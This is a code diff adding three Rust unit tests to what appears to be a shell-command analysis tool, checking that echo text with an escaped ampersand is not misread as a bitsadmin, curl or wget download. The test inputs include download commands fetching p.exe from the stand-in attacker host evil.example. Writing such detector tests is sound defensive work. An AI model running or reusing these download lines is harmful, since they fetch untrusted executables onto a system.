@@ -9382,6 +9382,57 @@ mod aria2_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn escaped_ampersand_bitsadmin_text_does_not_emit_structured_download() {
+        let report = crate::analyze(
+            br#"echo keep ^& bitsadmin /transfer job http://evil.example/p.exe p.exe"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::BitsadminDownload { url, .. } if url == "http://evil.example/p.exe"
+            )),
+            "escaped ampersand echo text was misread as bitsadmin download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_curl_text_does_not_emit_structured_download() {
+        let report = crate::analyze(
+            br#"echo keep ^& curl -o p.exe http://evil.example/p.exe"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://evil.example/p.exe"
+            )),
+            "escaped ampersand echo text was misread as curl download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_wget_text_does_not_emit_structured_download() {
+        let report = crate::analyze(
+            br#"echo keep ^& wget http://evil.example/p.exe -O p.exe"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://evil.example/p.exe"
+            )),
+            "escaped ampersand echo text was misread as wget download: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
